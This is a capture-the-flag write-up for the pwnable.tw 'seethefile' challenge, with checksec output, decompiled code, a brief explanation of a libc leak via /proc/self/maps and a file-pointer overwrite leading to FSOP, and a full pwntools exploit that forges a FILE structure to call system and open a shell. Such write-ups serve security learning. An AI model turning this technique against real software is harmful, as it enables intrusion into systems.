# pwnable.tw-seethefile

## checksec

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## IDA

**main**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char nptr[32]; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  init();
  welcome();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%s", nptr);
    switch ( atoi(nptr) )
    {
      case 1:
        openfile();
        break;
      case 2:
        readfile();
        break;
      case 3:
        writefile();
        break;
      case 4:
        closefile();
        break;
      case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return result;
      default:
        puts("Invaild choice");
        exit(0);
        return result;
    }
  }
}
```

可以读取除flag外的任意文件，所以我们可以通过这个来读取`/proc/self/maps`来leak libc。

而在`leave`中有一个溢出，同时读取的fp指针就在这附近，所以我们可以覆盖fp指针，从而伪造`IO_FILE_plus`来执行FSOP，细节参考另一篇文章[_IO\_FILE利用思路总结]()

## exp

```python
from pwn import *
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./seethefile'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	sh=process(binary)
if 'r' in sys.argv[1]:
	sh=remote('chall.pwnable.tw',10200)

elf = ELF(binary,checksec=False)
libc = ELF('libc_32.so.6',checksec=False)

def fopen(filename):
	sh.recvuntil('choice :')
	sh.sendline('1')
	sh.recvuntil('see :')
	sh.sendline(str(filename))

def fread():
	sh.recvuntil('choice :')
	sh.sendline('2')

def fwrite():
	sh.recvuntil('choice :')
	sh.sendline('3')	

def fclose():
	sh.recvuntil('choice :')
	sh.sendline('4')

def leave(name):
	sh.recvuntil('choice :')
	sh.sendline('5')
	sh.recvuntil('name :')
	sh.sendline(name)

fopen('/proc/self/maps')
fread()
fread()
fwrite()
sh.recvuntil("0 \n")
libcbase = int(sh.recv(8),16)
leak('libc base',libcbase)
system = libcbase + libc.sym['system']
binsh = libcbase+0x00158e8b
fp = 0x804B280
payload = b'a'*0x20
payload+=p32(fp+4)
payload+=p32(0xffffdfff)+b';$0\x00'
payload+=b'\x00'*(0x94-8)
payload+=p32(fp+0x94+4)
payload+=p32(system)*3
leave(payload)

sh.interactive()

```

